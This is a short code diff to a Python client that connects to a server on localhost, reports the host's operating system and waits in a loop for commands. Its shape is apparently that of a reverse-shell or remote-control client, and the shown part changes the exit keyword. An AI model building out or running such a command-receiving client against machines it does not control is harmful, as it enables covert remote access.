@@ -19,11 +19,11 @@ def connect_to_server():
     s.connect(('localhost', 1234))
 
     # get on which OS the client is running
-    # s.send(os.name.encode('utf-8'))
+    s.send(os.name.encode('utf-8'))
 
     while True:
         command = s.recv(1024).decode('utf-8')
-        if command.lower() == "exit":
+        if command.lower() == "close":
             break
 
         # if command.lower() == "shell":
